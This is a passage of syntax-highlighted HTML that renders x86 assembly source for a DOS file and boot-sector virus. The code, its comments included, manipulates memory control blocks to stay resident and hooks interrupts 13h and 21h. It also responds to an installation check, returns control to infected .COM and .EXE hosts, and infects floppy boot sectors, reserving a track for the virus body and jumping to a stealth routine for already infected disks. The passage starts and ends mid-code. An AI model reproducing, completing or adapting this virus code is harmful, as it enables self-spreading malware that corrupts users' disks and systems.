        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc3">"Z"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ok_mcb</span><span class="sc0">
</span><span class="sc1">;Next mcb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">nextmcb</span><span class="sc0">
</span><span class="sc5">ok_mcb</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Check mcb size        </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc5">para_size</span><span class="sc4">+</span><span class="sc2">4000h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">ok_mcb_size</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">control_end</span><span class="sc0">
</span><span class="sc5">ok_mcb_size</span><span class="sc4">:</span><span class="sc0">        
</span><span class="sc1">;Sub top of memory in psp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc5">para_size</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">handle_mcb</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Sub virus size and mcb size</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc5">para_size</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc1">;Clear the last mcb field</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc3">"M"</span><span class="sc0">
</span><span class="sc1">;Jump to next mcb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;Mark mcb as last in the chain</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc3">"Z"</span><span class="sc0">
</span><span class="sc1">;Set dos as owner</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">0008h</span><span class="sc0">
</span><span class="sc1">;Set mcb size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc5">para_size</span><span class="sc0">
</span><span class="sc1">;Mark UMB as system code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0008h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"CS"</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc1">;Copy to memory</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">        
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">lenvir</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc1">;Save virus segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;Hook int 13h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">my_int13h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_int</span><span class="sc0">
</span><span class="sc1">;Hook int 21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_int</span><span class="sc0">
</span><span class="sc5">control_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Restore old int 03h        </span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old03h</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_int</span><span class="sc0">
</span><span class="sc1">;Return to host</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">prog_type</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc3">"E"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exit_exe</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Exit from .COM</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">exit_com</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Restore first three bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_header</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc1">;Restore segment registers</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc1">;Check if launcher execution</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">endprog</span><span class="sc0">
</span><span class="sc1">;Get control back to host</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">zero_all</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc1">;Exit program if launcher execution</span><span class="sc0">
</span><span class="sc5">endprog</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4C00h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Exit from .EXE</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">exit_exe</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Restore segment registers</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc1">;Get control back to host</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_header</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_header</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_header</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exeret</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exeret</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_header</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fix1</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fix2</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">zero_all</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">
</span><span class="sc5">fix1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BCh</span><span class="sc0">
</span><span class="sc5">fix2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">exeret</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Virus int 13h handler</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">my_int13h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_flag</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ok_dos_flag</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">wait_dos</span><span class="sc0">
</span><span class="sc5">ok_dos_flag</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
</span><span class="sc1">;Installation check</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_check</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">00BADh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">my13h_exit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0FACEh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">my13h_exit</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0DEADh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0BABEh</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">cmc</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">not_check</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Do not use our int 13h handler if we are using our int 21h handler</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">running_sw</span><span class="sc4">],</span><span class="sc3">"R"</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">my13h_exit</span><span class="sc0">
</span><span class="sc1">;Check for read operations</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">my13h_exit</span><span class="sc0">
</span><span class="sc1">;Side 0 of drive a:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">my13h_exit</span><span class="sc0">
</span><span class="sc1">;Track 0, sector 1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infect_floppy</span><span class="sc0">
</span><span class="sc1">;Get control back to old int 13h</span><span class="sc0">
</span><span class="sc5">my13h_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old13h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Infect floppy on drive a:</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">infect_floppy</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Perform read operation</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old13h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">boot_read_ok</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">boot_read_ok</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Check for JMP SHORT at the beginning</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc2">0EBh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_disk</span><span class="sc0">
</span><span class="sc1">;Check if infected</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_position</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc5">boot_marker</span><span class="sc4">-</span><span class="sc5">boot_code</span><span class="sc4">],</span><span class="sc3">"RC"</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_infected</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">stealth_boot</span><span class="sc0">
</span><span class="sc5">not_infected</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Check for mbr marker also in floppy</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">01FEh</span><span class="sc4">],</span><span class="sc2">0AA55h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">floppy_infection</span><span class="sc0">
</span><span class="sc5">exit_disk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">cmc</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc1">;Calculate track and head for floppy</span><span class="sc0">
</span><span class="sc5">floppy_infection</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Get sectors per track</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;Cut one track for virus body</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc1">;Divide total sectors by sectors per track</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc1">;Get heads parameter</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc1">;Divide tracks by heads</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc1">;Save virus body position in floopy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">load_cx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
